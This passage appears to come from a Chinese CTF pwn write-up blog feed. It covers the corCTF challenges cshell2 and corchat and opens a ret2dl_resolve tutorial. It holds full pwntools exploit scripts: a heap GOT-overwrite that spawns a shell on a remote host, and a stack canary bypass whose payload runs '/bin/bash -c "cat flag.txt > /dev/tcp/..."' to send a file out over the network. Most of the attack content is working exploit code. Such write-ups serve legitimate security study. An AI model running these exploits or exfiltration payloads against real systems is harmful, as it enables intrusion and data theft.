class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=[<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>]</span>):<br>    fn=data[<span class="hljs-number">0</span>]<br>    mn=data[<span class="hljs-number">1</span>]<br>    ln=data[<span class="hljs-number">2</span>]<br>    age=data[<span class="hljs-number">3</span>]<br>    bio=data[<span class="hljs-number">4</span>]<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size (1032 minimum): &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;firstname: &#x27;</span>,fn)<br>    p.sendafter(<span class="hljs-string">&#x27;middlename: &#x27;</span>,mn)<br>    p.sendafter(<span class="hljs-string">&#x27;lastname: &#x27;</span>,ln)<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br>    p.sendafter(<span class="hljs-string">&#x27;bio: &#x27;</span>,bio)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.readuntil(<span class="hljs-string">&#x27;last: &#x27;</span>)<br>    ln=p.readuntil(<span class="hljs-string">&#x27; first: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    fn=p.readuntil(<span class="hljs-string">&#x27; middle: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    mn=p.readuntil(<span class="hljs-string">&#x27; age: &#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    age=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\nbio: &#x27;</span>,drop=<span class="hljs-number">1</span>))<br>    bio=p.readuntil(<span class="hljs-string">&#x27;1 Add&#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> [fn,mn,ln,age,bio]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    fn=data[<span class="hljs-number">0</span>]<br>    mn=data[<span class="hljs-number">1</span>]<br>    ln=data[<span class="hljs-number">2</span>]<br>    age=data[<span class="hljs-number">3</span>]<br>    bio=data[<span class="hljs-number">4</span>]<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;firstname: &#x27;</span>,fn)<br>    p.sendafter(<span class="hljs-string">&#x27;middlename: &#x27;</span>,mn)<br>    p.sendafter(<span class="hljs-string">&#x27;lastname: &#x27;</span>,ln)<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br>    p.sendafter(<span class="hljs-string">&#x27;bio: &#x27;</span>,bio)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">ind,age</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;re-age user&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>,<span class="hljs-built_in">str</span>(age))<br><br>e=ELF(<span class="hljs-string">&#x27;./cshell2&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>ld=ELF(<span class="hljs-string">&#x27;./ld.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>heap_array=<span class="hljs-number">0x4040c0</span><br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>p=remote(<span class="hljs-string">&#x27;be.ax 31667&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0xa</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">0xb</span>,<span class="hljs-number">0x408</span>,[<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>])<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x428</span>)<br><br>d=show(<span class="hljs-number">0</span>)<br>d1=u64(d[<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>heap_addr=d1&amp;<span class="hljs-number">0xfffffffffffff000</span><br><br>d0=u64(d[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d0))<br>libc.address=(d0&amp;<span class="hljs-number">0xffffffffffffff00</span>)-((libc.sym[<span class="hljs-string">&#x27;_IO_wide_data_0&#x27;</span>]+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">224</span>)&amp;<span class="hljs-number">0xffffffffffffff00</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>free_f=libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>puts=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>fail=libc.sym[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]<br>printf=libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>malloc=libc.sym[<span class="hljs-string">&#x27;malloc&#x27;</span>]<br>setvbuf=libc.sym[<span class="hljs-string">&#x27;setvbuf&#x27;</span>]<br>scanf=libc.sym[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br>free(<span class="hljs-number">0xa</span>)<br><br>free(<span class="hljs-number">1</span>)<br><br>heap_array_1=heap_array+<span class="hljs-number">0x10</span><br>heap_array_1_size=heap_array_1+<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_array_1_size))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x450</span>)<br><br>change(<span class="hljs-number">2</span>,heap_array_1_size-<span class="hljs-number">0x20</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>heap_0=heap_addr+<span class="hljs-number">0x290</span><br>heap_1=heap_0+<span class="hljs-number">0x420</span><br>heap_1_fd=heap_1+<span class="hljs-number">0x10</span><br><br>edit(<span class="hljs-number">1</span>,[p64((free_got-<span class="hljs-number">0x8</span>)^(heap_1_fd&gt;&gt;<span class="hljs-number">12</span>)),<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27; &#x27;</span>])<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x408</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x408</span>,[p64(system),p64(system),p64(puts),fail,p64(scanf)])<br>free(<span class="hljs-number">0xb</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="corchat">corchat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">ChatServer::RecvCrusaderMessages</span><span class="hljs-params">(<span class="hljs-type">void</span> *context)</span><br>&#123;<br>    ChatServer *ctx = (ChatServer *)context;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-built_in">strlen</span>(COR_MSG_TYPES[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span>];<br>    Crusader *cur_crusader;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ctx-&gt;m_connected_crusaders == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int8_t</span> crusader_idx = <span class="hljs-number">0</span>; crusader_idx &lt; MAX_CRUSADERS; crusader_idx++)<br>        &#123;<br>            cur_crusader = ctx-&gt;m_crusader_seats[crusader_idx];<br>            <span class="hljs-keyword">if</span> (cur_crusader == nullptr)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (cur_crusader-&gt;Recv(buffer, <span class="hljs-built_in">strlen</span>(COR_MSG_TYPES[<span class="hljs-number">0</span>])) == <span class="hljs-literal">false</span>)<br>            &#123;<br>                delete cur_crusader;<br>                ctx-&gt;m_crusader_seats[crusader_idx] = nullptr;<br>                ctx-&gt;m_connected_crusaders--;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;SET_UNAME&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                msg = cur_crusader-&gt;RecvUname();<br>                <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&quot;&quot;</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>                cur_crusader-&gt;SetUname(msg.c_str(), msg.length());<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;GETSTATUS&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; cur_crusader-&gt;is_admin == <span class="hljs-literal">true</span>)<br>            &#123;<br>                <span class="hljs-comment">/* 控制程序流时需要将返回地址修改为 call DoAdmin 指令的地址 */</span><br>                DoAdmin(<span class="hljs-string">&quot;top -n 1&quot;</span>, cur_crusader-&gt;m_sock_fd);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;_SEND_MSG&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                msg = cur_crusader-&gt;RecvMessage();<br>                <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&quot;&quot;</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">if</span> (ctx-&gt;m_connected_crusaders &gt; <span class="hljs-number">1</span>)<br>                    ctx-&gt;BroadcastMsg(cur_crusader, msg.c_str(), msg.length(), <span class="hljs-literal">true</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buffer, <span class="hljs-string">&quot;GET_UNAME&quot;</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> response = <span class="hljs-string">&quot;You are known as &quot;</span> + cur_crusader-&gt;GetUname() + <span class="hljs-string">&quot;\n&quot;</span>;<br>                cur_crusader-&gt;SendMsg(response.c_str(), response.length(), <span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> len;<br>&#125; cor_msg_buf;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">uint16_t</span> len;<br>&#125; cor_uname_buf;<br><span class="hljs-type">void</span> <span class="hljs-title function_">DoAdmin</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">int8_t</span> fd)</span><br>&#123;<br>    FILE *p;<br>    <span class="hljs-type">char</span> c;<br><br>    p = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Something went wrong spawning the process!&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (feof(p) == <span class="hljs-literal">false</span>)<br>    &#123;<br>        fread(&amp;c, <span class="hljs-keyword">sizeof</span>(c), <span class="hljs-number">1</span>, p);<br>        <span class="hljs-keyword">if</span> (send(fd, &amp;c, <span class="hljs-keyword">sizeof</span>(c), <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    pclose(p);<br>&#125;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title function_">Crusader::RecvMessage</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg = <span class="hljs-string">&quot;&quot;</span>;<br>    cor_msg_buf msg_buf;<br><br>    <span class="hljs-built_in">memset</span>(msg_buf.buffer, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(msg_buf.buffer));<br><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.len, <span class="hljs-keyword">sizeof</span>(msg_buf.len)) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    <span class="hljs-keyword">if</span> (msg_buf.len &gt;= <span class="hljs-keyword">sizeof</span>(msg_buf.buffer) || msg_buf.len == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.flags, <span class="hljs-keyword">sizeof</span>(msg_buf.flags)) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    msg_buf.len -= <span class="hljs-keyword">sizeof</span>(msg_buf.flags); <br>    <span class="hljs-keyword">if</span> (msg_buf.len &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br>    <span class="hljs-comment">/* 当msg_buf.len 等于1 时 1-2==-1 </span><br><span class="hljs-comment">        因为msg_buf.len 为uint16_t 类型，所以实际上msg_buf.len会变成65535 */</span><br>    <span class="hljs-keyword">if</span> (read(this-&gt;m_sock_fd, msg_buf.buffer, msg_buf.len) &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> msg;<br><br>    msg_buf.buffer[msg_buf.len] = <span class="hljs-string">&#x27;\x00&#x27;</span>;<br>    <span class="hljs-comment">/* 因为程序开启了stack canary，所以需要绕过验证</span><br><span class="hljs-comment">        在程序中存放当前线程的canary的地址就在 &amp;msg_buf+0xd78 的位置</span><br><span class="hljs-comment">        所以可以先通过多次溢出设置当前线程的canary为 0</span><br><span class="hljs-comment">        主要就是通过溢出msg_buf.buffer 修改msg_buf.len的值，来达到0~0xffff范围内任意地址写0*/</span><br>    msg += msg_buf.buffer;<br><br>    <span class="hljs-keyword">return</span> msg;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/corctf/corctf-pwn-corchat.jpg" srcset="/img/loading.gif" lazyload alt=""><br>通过逆向不难看出这里的<code>a1</code>，指向了代码中的<code>msg</code>，所以如果现在控制程序流调用某个函数，那么那个函数的第一个参数就是<code>&amp;msg</code>，就是我们输入的<code>msg_buf.buffer</code>的内容,在程序中存在函数<code>popen</code>可以指向系统命令,如何可以控制程序流执行<code>popen</code>函数就可以直接在靶机中执行我们像执行的系统命令了，但程序中没有可以用来获取程序地址的漏洞，所以无法通过直接调用<code>popen</code>的方式执行命令,不过可以通过一个能够执行一指令从而调用<code>popen</code>的程序地址，但在当前线程的栈中必须存在与其相近的地址，而<code>Crusader::RecvMessage</code>函数会返回到<code>ChatServer::RecvCrusaderMessages</code>函数中，所以只要控制了返回地址的低两个字节，就可以使程序执行<code>ChatServer::RecvCrusaderMessages</code>函数中的<code>DoAdmin(msg,???);</code>指令,进而利用<code>popen</code>函数执行我们想要执行的系统命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setuname</span>(<span class="hljs-params">data</span>):<br>    p.send(<span class="hljs-string">&#x27;SET_UNAME&#x27;</span>)<br>    p.send(p16(<span class="hljs-number">0x1f</span>)+data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getstatus</span>():<br>    p.send(<span class="hljs-string">&#x27;GETSTATUS&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendmsg</span>(<span class="hljs-params">data,flags=<span class="hljs-number">0</span></span>):<br>    p.send(<span class="hljs-string">&#x27;_SEND_MSG&#x27;</span>)<br>    p.send(p16(<span class="hljs-number">1</span>))<br>    p.send(p16(flags))<br>    p.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getuname</span>():<br>    p.send(<span class="hljs-string">&#x27;GET_UNAME&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;8080&#x27;</span>)<br>cookie=<span class="hljs-number">0xd78</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    sendmsg(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span>+p16(<span class="hljs-number">0</span>)+p16(cookie+i)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*(i+<span class="hljs-number">1</span>))<br>    pause()<br><span class="hljs-comment"># set canary=0</span><br><br>payload=<span class="hljs-string">&#x27;/bin/bash -c &quot;cat flag.txt &gt; /dev/tcp/127.0.0.1/8888&quot; &#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p16(<span class="hljs-built_in">len</span>(payload))*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;\x11&#x27;</span><br>sendmsg(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dl_resolve</title>
    <link href="/page/ret2dl_runtime_resolve/"/>
    <url>/page/ret2dl_runtime_resolve/</url>
    
    <content type="html"><![CDATA[<p>是利用elf文件的延迟绑定技术<code>_dl_runtime_resolve</code>，达到攻击目的的一种技术</p><p>程序在执行时，程序<code>link_map</code>结构体的地址位于<code>got表</code>的第二项，<code>_dl_runtime_resolve</code>函数地址位于<code>got表</code>的第三项</p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve.jpg" srcset="/img/loading.gif" lazyload alt="&quot;函数第一次调用前&quot;" title="函数第一次调用前"></p><p>在使用<code>_dl_runtime_resolve</code>导出函数时，会设置函数在<code>got表</code>中对应的项为函数真实地址</p><p>如果程序开启了<code>PIE</code>保护，那么会在加载程序的阶段，将<code>got表</code>中对应函数的真实地址填入</p><p><code>_dl_runtime_resolve</code> 在<code>sysdeps/架构/dl-trampoline.h</code>文件中，是一段汇编代码，通过栈传入两个参数，第一个参数是当前程序的<code>link_map结构体的地址</code>，第二个参数是函数在<code>.rel.plt表中的索引值</code>，函数首先保存寄存器的值，然后调用<code>_dl_fixup</code>函数，最后还原寄存器，并执行函数</p><p><code>_dl_fixup</code>在<code>elf/dl-runtime.c</code>文件中，传入两个参数,参数与<code>_dl_runtime_resolve</code>的参数相同，函数先通过<code>link_map</code>获取程序中各种段的地址，经过各种检测后，通过<code>_dl_lookup_symbol_x</code>从<code>link_map.l_scope</code>中搜索符号，并返回符号地址，再经过各种检测后，如果未开启绑定，就直接返回符号地址，否则执行<code>elf_machine_fixup_plt</code>函数，设置<code>got表</code>中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 获取各种段的地址</span><br><span class="hljs-comment">    这些段的地址不是直接储存在 l_info中，而是储存在程序的 dynamic段中 */</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取 dnysym 表地址</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>    <span class="hljs-comment">// 获取 dnystr 表地址</span><br><span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 获取函数在 rel.plt 中对应成员的地址</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <span 